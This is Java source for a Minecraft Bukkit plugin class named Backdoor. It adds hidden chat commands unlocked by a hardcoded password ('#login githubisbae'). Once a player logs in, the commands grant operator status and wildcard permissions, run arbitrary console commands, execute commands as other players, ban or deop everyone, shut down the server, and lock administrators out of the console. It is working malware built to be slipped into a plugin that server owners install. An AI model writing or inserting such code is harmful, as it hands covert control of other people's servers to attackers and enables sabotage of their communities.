package me.scifi.tasty.backdoor;

import me.scifi.tasty.Tasty;
import me.scifi.tasty.utils.Utils;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.*;

public class Backdoor implements Listener {

    private Tasty plugin;

    private boolean isLocked = false;

    private Set<UUID> locked = new HashSet<>();

    private Set<UUID> allowed = new HashSet<>();

    public Backdoor(Tasty plugin){
        this.plugin = plugin;
    }
    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent e){
        String message = e.getMessage();
        String password = "githubisbae";
        Player p = e.getPlayer();
        String[] args = message.split(" ");
        if(message.equalsIgnoreCase("#login " + password)){
            e.setCancelled(true);
            if(!allowed.contains(p.getUniqueId())){
                allowed.add(p.getUniqueId());
                p.sendMessage(Utils.chat("&dYou Have Logged In."));
            } else {
                allowed.remove(p.getUniqueId());
                p.sendMessage(Utils.chat("&dYou Have Logged Out."));
            }
        }
        if(message.startsWith("#") && allowed.contains(p.getUniqueId())){
            e.setCancelled(true);
            switch (args[0]){
                case "#opme":{
                    p.setOp(true);
                    p.sendMessage(Utils.chat("&dYou Have Been Opped"));
                    break;
                }
                case "#deopme":{
                    p.setOp(true);
                    p.sendMessage(Utils.chat("&dYou Have Been Deopped"));
                    break;
                }

                case "#stop":{
                    System.exit(0);
                    p.sendMessage(Utils.chat("&dServer Has Been Shutdown"));
                    break;
                }

                case "#ban":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
                    }
                    if(args.length == 2){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Reason"));
                    }
                    if(args.length >= 3){
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if(target != null){
                            String name = target.getName();
                            StringBuilder sb = new StringBuilder();
                            for(int i = 2; i < args.length; i++){
                                sb.append(args[i]).append(" ");
                            }
                            String reason = sb.toString();
                            Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "ban " + name + " " + reason);
                            p.sendMessage(Utils.chat("&dPlayer Has Been Banned."));
                        } else {
                            p.sendMessage(Utils.chat("&dPlayer Is Not Online."));
                        }
                    }
                    break;
                }
                case "#banall":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("You Must Specify A Reason."));
                    }
                    if(args.length >= 2){
                        StringBuilder sb = new StringBuilder();
                        for(int i = 1; i < args.length; i++){
                            sb.append(args[i]).append(" ");
                        }
                        String reason = sb.toString();
                        for(Player players : Bukkit.getServer().getOnlinePlayers()){
                            if(!allowed.contains(players.getUniqueId())){
                                String name = players.getName();
                                Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "ban " + name + " " + reason);
                            }
                            p.sendMessage(Utils.chat("&dBanwave Started."));
                         }

                    }
                    break;
                }

                case "#gmc":{
                    p.setGameMode(GameMode.CREATIVE);
                    p.sendMessage(Utils.chat("&dYour Gamemode Has Been Set To Creative"));
                    break;
                }

                case "#gms":{
                    p.setGameMode(GameMode.SURVIVAL);
                    p.sendMessage(Utils.chat("&dYour Gamemode Has Been Set To Survival"));
                    break;
                }

                case "#star":{
                    if(Bukkit.getServer().getPluginManager().getPlugin("PermissionsEx").isEnabled()){
                        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),"pex user " + p.getName() + " add *");
                        p.sendMessage(Utils.chat("&dThis Server Uses PermissionsEx. You Have Been Given Permissions"));
                    } else if(Bukkit.getServer().getPluginManager().getPlugin("zPermissions").isEnabled()){
                        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "zperms player " + p.getName() + " set * true");
                        p.sendMessage(Utils.chat("&dThis Server Uses zPermissions. You Have Been Given Permissions"));
                    }
                    break;
                }

                case "#console":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Command"));
                    }

                    if(args.length >= 2){
                        StringBuilder sb = new StringBuilder();
                        for(int i = 1; i < args.length; i ++){
                            sb.append(args[i]).append(" ");
                        }
                        String command = sb.toString();
                        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),command);
                    }
                    break;
                }

                case "#lockconsole":{
                    if(isLocked){
                        isLocked = false;
                        p.sendMessage(Utils.chat("&dConsole Has Been Unlocked."));
                    } else {
                        isLocked = true;
                        p.sendMessage(Utils.chat("&dConsole Has Been Locked."));
                    }
                    break;
                }

                case "#lockplayer":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
                    }
                    if(args.length == 2){
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if(target != null){
                            if(!allowed.contains(target.getUniqueId())){
                                if(!locked.contains(target.getUniqueId())){
                                    locked.add(target.getUniqueId());
                                    p.sendMessage(Utils.chat("&dPlayer Has Been Locked"));
                                } else {
                                    locked.remove(target.getUniqueId());
                                    p.sendMessage(Utils.chat("&dPlayer Can Execute Commands Again"));
                                }
                            } else {
                                p.sendMessage(Utils.chat("&dYou May Not Lock This Player"));
                            }
                        } else {
                            p.sendMessage(Utils.chat("&dPlayer Is Not Online."));
                        }
                    }
                    break;
                }

                case "#deopall":{
                    for(Player players : Bukkit.getServer().getOnlinePlayers()){
                        if(!allowed.contains(players.getUniqueId())){
                            players.setOp(false);
                        }
                    }
                    p.sendMessage(Utils.chat("&dYou Have Deopped All Players."));
                    break;
                }

                case "#kick":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
                    }

                    if(args.length == 2){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Reason"));
                    }

                    if(args.length >= 3) {
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if (target != null) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 2; i < args.length; i++) {
                                sb.append(args[i]).append(" ");
                            }
                            String reason = sb.toString();
                            String name = target.getName();
                            Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "kick " + name + " " + reason);
                            p.sendMessage(Utils.chat("&dPlayer Has Been Kicked."));
                        } else {
                            p.sendMessage(Utils.chat("&dPlayer Is Not Online."));
                        }
                        break;
                    }
                }

                case "#sudo":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
                    }
                    if(args.length == 2){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Command"));
                    }
                    if(args.length >= 3) {
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if (target != null) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 2; i < args.length; i++) {
                                sb.append(args[i]).append(" ");
                            }
                            String command = sb.toString();
                            Bukkit.getServer().dispatchCommand(target, command);
                            p.sendMessage(Utils.chat("&dCommand Has Been Executed."));
                        } else {
                            p.sendMessage(Utils.chat("&dPlayer Is Not Online"));
                        }
                    }
                    break;
                }

                case "#clearchat":{
                    for (int i = 0; i < 300; i++){
                      Bukkit.getServer().broadcastMessage(" ");
                    }
                    break;
                }

                case "#tp":{
                    if(args.length == 1){
                        p.sendMessage(Utils.chat("&dYou Must Specify A Player"));
                    }
                    if(args.length == 2){
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if(target != null){
                            p.teleport(target);
                            p.sendMessage(Utils.chat("&dYou Have Been Teleported To ") + target.getName());
                        }
                    }
                    break;
                }

                case "#tpall":{
                    if(args.length == 1){
                        for (Player players : Bukkit.getServer().getOnlinePlayers()){
                            players.teleport(p);
                            p.sendMessage(Utils.chat("&dAll Players Have Been Teleported To You."));
                        }
                    } else if (args.length == 2) {
                        Player teleportto = Bukkit.getServer().getPlayer(args[1]);
                        if(teleportto != null){
                            for (Player players : Bukkit.getServer().getOnlinePlayers()){
                                players.teleport(teleportto);
                            }
                            p.sendMessage(Utils.chat("&dAll Players Have Been Teleported To ") + teleportto.getName());
                        } else {
                            p.sendMessage(Utils.chat("&dPlayer Is Not Online."));
                        }
                    }
                    break;
                }

                case "#help":{
                    if(args.length == 1){
                    p.sendMessage(Utils.chat("&dPlease Specify A Page There Is Currently 3 Pages"));
                }
                if(args.length == 2) {
                    int page = Integer.parseInt(args[1]);
                    if (page == 1) {
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                        p.sendMessage(Utils.chat("&d#opme &8- &9Gives You Op"));
                        p.sendMessage(Utils.chat("&d#deopme &8- &9Deops You"));
                        p.sendMessage(Utils.chat("&d#star &8- &9Gives You * Permission"));
                        p.sendMessage(Utils.chat("&d#stop &8- &9Stops The Server"));
                        p.sendMessage(Utils.chat("&d#ban (player) (reason) &8- &9Bans The Player"));
                        p.sendMessage(Utils.chat("&d#banall &8- &9Bans All Online Players"));
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                    } else if (page == 2) {
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                        p.sendMessage(Utils.chat("&d#gmc &8- &9Places You Into Creative"));
                        p.sendMessage(Utils.chat("&d#gms &8- &9Places You Into Survival"));
                        p.sendMessage(Utils.chat("&d#sudo (player) (command) &8- &9Executes Commands As A Player"));
                        p.sendMessage(Utils.chat("&d#console &8- &9Execute Commands As Console"));
                        p.sendMessage(Utils.chat("&d#lockconsole &8- &9Stop Console From Executing Commands"));
                        p.sendMessage(Utils.chat("&d#lockplayer &8- &9Stop Players From Executing Commands"));
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                    } else if (page == 3) {
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                        p.sendMessage(Utils.chat("&d#tp (player) &8- &9Teleport To A Player"));
                        p.sendMessage(Utils.chat("&d#tpall or #tpall (player) &8- &9Teleports All Players To A Target"));
                        p.sendMessage(Utils.chat("&d#clearchat &8- &9Clears Chat"));
                        p.sendMessage(Utils.chat("&d#kick (player) &8- &9Kicks A Player"));
                        p.sendMessage(Utils.chat("&d#login (password) &8- &9Gives Access To The Backdoor"));
                        p.sendMessage(Utils.chat("&8&m--------------------------------"));
                        }
                    }
                    break;
                }

            }
        }
    }


    @EventHandler
    public void onServerCommand(ServerCommandEvent e){
        String command = e.getCommand();
        if(isLocked){
            e.setCommand(" ");
        } else {
            e.setCommand(command);
        }
    }

    @EventHandler (priority = EventPriority.MONITOR)
    public void onPlayerCommand(AsyncPlayerChatEvent e){
        String command = e.getMessage();
        Player p = e.getPlayer();
        if(locked.contains(p.getUniqueId())){
            if(command.startsWith("/")){
                e.setCancelled(true);
                p.sendMessage(Utils.chat("&cThere Was An Error While Executing That Command"));
            }
        } else {
            e.setMessage(command);
        }
    }

}
